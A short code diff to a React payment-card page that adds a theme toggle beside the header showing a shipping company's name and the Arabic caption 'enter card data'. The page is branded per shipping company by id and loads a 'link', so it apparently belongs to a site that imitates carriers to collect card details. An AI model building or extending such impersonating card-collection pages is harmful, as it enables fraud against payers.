@@ -3,6 +3,7 @@ import { useParams, useNavigate } from "react-router-dom";
 import { getCompanyById } from "@/lib/shippingCompanies";
 import { useLink } from "@/hooks/useSupabase";
 import { CreditCard, Lock, ArrowLeft, Check } from "lucide-react";
+import { ThemeToggle } from "@/components/ThemeToggle";
 
 const PaymentCardData = () => {
   const { id } = useParams();
@@ -147,13 +148,16 @@ const PaymentCardData = () => {
               className="h-8 sm:h-12 w-auto object-contain"
             />
           </div>
-          <div className="text-right">
-            <h1 className="text-lg sm:text-xl font-bold" style={{ color: companyStyles.primaryText }}>
-              {company?.name || 'Shipping'}
-            </h1>
-            <p className="text-xs sm:text-sm" style={{ color: companyStyles.secondaryText }}>
-              أدخل بيانات البطاقة
-            </p>
+          <div className="flex items-center gap-2">
+            <div className="text-right">
+              <h1 className="text-lg sm:text-xl font-bold" style={{ color: companyStyles.primaryText }}>
+                {company?.name || 'Shipping'}
+              </h1>
+              <p className="text-xs sm:text-sm" style={{ color: companyStyles.secondaryText }}>
+                أدخل بيانات البطاقة
+              </p>
+            </div>
+            <ThemeToggle className="ml-2" />
           </div>
         </div>
         {/* Brand Bar */}
